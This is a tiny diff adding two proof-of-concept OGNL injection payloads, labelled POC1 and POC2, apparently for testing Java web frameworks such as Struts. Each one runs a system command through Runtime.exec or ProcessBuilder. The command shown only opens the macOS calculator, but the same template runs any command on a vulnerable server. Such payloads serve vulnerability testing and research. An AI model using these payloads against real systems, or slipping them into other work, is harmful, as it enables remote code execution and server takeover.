@@ -1,0 +1,5 @@
+POC1
+%{#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec("open -a Calculator.app")}
+
+POC2
+%{new java.lang.ProcessBuilder(new java.lang.String[]{"open", "-a","Calculator.app"}).start()}
